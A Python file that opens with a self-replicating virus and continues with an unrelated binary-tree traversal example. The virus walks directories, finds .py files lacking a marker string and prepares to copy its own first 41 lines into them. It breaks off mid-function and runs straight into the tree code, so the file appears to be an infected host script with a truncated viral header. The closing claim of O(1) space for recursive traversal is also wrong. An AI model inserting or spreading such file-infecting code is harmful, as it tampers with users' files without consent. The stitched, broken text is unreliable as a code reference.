#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to for tree traversals
  
# A class that represents an individual node in a
# Binary Tree
  
  
class Node:
    def __init__(self, key):
        self.left = None
        self.right = None
        self.val = key
  
  
# A function to do inorder tree traversal
def printInorder(root):
  
    if root:
  
        # First recur on left child
        printInorder(root.left)
  
        # then print the data of node
        print(root.val),
  
        # now recur on right child
        printInorder(root.right)
  
  
# A function to do postorder tree traversal
def printPostorder(root):
  
    if root:
  
        # First recur on left child
        printPostorder(root.left)
  
        # the recur on right child
        printPostorder(root.right)
  
        # now print the data of node
        print(root.val),
  
  
# A function to do preorder tree traversal
def printPreorder(root):
  
    if root:
  
        # First print the data of node
        print(root.val),
  
        # Then recur on left child
        printPreorder(root.left)
  
        # Finally recur on right child
        printPreorder(root.right)
  
  
# Driver code
root = Node(1)
root.left = Node(2)
root.right = Node(3)
root.left.left = Node(4)
root.left.right = Node(5)
print("Preorder traversal of binary tree is")
printPreorder(root)
  
print("\nInorder traversal of binary tree is")
printInorder(root)
  
print("\nPostorder traversal of binary tree is")
printPostorder(root)
'''
Time Complexity: O(n)
Space Complexity: O(1)
'''